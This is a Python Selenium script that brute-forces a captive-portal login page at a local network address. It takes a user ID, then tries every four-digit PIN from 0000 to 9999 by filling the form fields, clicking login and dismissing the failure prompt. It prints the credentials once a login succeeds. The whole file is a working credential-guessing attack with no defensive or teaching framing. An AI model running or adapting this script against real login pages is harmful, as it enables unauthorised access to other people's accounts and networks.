from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException

_UserList = []
_PasswordList = []
user_cnt = 0
pass_cnt = 0
_UserList.append(str(input("Enter UserID:")))
browser = webdriver.Chrome("/chromedriver.exe")

browser.get("http://192.168.50.1/portal/user-authen.php")


def create_pass():
    for v in range(10):
        for w in range(10):
            for x in range(10):
                for y in range(10):
                    string = "{}{}{}{}".format(v, w, x, y)
                    _PasswordList.append(string)


create_pass()
while True:
    try:
        _UserForm = browser.find_element_by_xpath("/html/body/div[1]/div/div/div[1]/form/div[2]/input")
        _PassFrom = browser.find_element_by_xpath("/html/body/div[1]/div/div/div[1]/form/div[3]/input")
        _LoginButt = browser.find_element_by_xpath("/html/body/div[1]/div/div/div[1]/form/div[4]/div/button")
        print("Try:" + _UserList[user_cnt], _PasswordList[pass_cnt])
        _UserForm.clear()
        _PassFrom.clear()
        _UserForm.send_keys(str(_UserList[0]))
        _PassFrom.send_keys(str(_PasswordList[pass_cnt]))
        _LoginButt.click()
        _FailButt = browser.find_element_by_xpath("/html/body/div[1]/div/div/div[2]/div/input")
        _FailButt.click()
        if pass_cnt == 9999:
            pass_cnt = 0
        pass_cnt += 1
    except NoSuchElementException:
        print("The username is ", str(_UserList[user_cnt]), " and The password is ", (_PasswordList[pass_cnt - 1]))
        browser.quit()
        quit()
